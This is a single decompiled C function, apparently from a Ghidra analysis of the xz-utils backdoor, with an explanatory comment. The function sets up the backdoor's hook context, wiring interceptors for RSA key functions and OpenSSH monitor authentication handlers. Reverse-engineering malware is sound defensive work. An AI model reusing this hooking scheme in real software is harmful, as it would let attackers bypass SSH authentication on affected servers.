// /home/kali/xzre-ghidra/xzregh/1027D0_init_hooks_ctx.c
// Function: init_hooks_ctx @ 0x1027D0
// Calling convention: __stdcall
// Prototype: int __stdcall init_hooks_ctx(backdoor_hooks_ctx_t * ctx)


/*
 * AutoDoc:         Primes the transient `backdoor_hooks_ctx_t` with pointers to the shared hooks blob, the
 * audit shim (`backdoor_symbind64`), and the mm/EVP hook entry points. When `shared` is still NULL it
 *         seeds the structure with the static hook addresses and returns 0x65 so the caller can retry
 *         once the shared globals are available; otherwise it returns 0 to signal that hook setup may
 *         proceed.
 *     
 */
#include "xzre_types.h"


int init_hooks_ctx(backdoor_hooks_ctx_t *ctx)

{
  int iVar1;
  int status;
  
  iVar1 = 5;
  if (ctx != (backdoor_hooks_ctx_t *)0x0) {
    ctx->hooks_data_addr = (backdoor_hooks_data_t **)&hooks_data;
    iVar1 = 0;
    if (ctx->shared == (backdoor_shared_globals_t *)0x0) {
      ctx->_unknown1632[0] = '\x04';
      ctx->_unknown1632[1] = '\0';
      ctx->_unknown1632[2] = '\0';
      ctx->_unknown1632[3] = '\0';
      ctx->_unknown1632[4] = '\0';
      ctx->_unknown1632[5] = '\0';
      ctx->_unknown1632[6] = '\0';
      ctx->_unknown1632[7] = '\0';
      ctx->symbind64 = (audit_symbind64_fn)&LAB_001028d0;
      ctx->hook_RSA_public_decrypt = hook_RSA_public_decrypt;
      ctx->hook_RSA_get0_key = hook_RSA_get0_key;
      ctx->mm_log_handler = mm_log_handler_hook;
      ctx->mm_answer_keyallowed = mm_answer_keyallowed_hook;
      ctx->mm_answer_keyverify = mm_answer_keyverify_hook;
      iVar1 = 0x65;
    }
  }
  return iVar1;
}

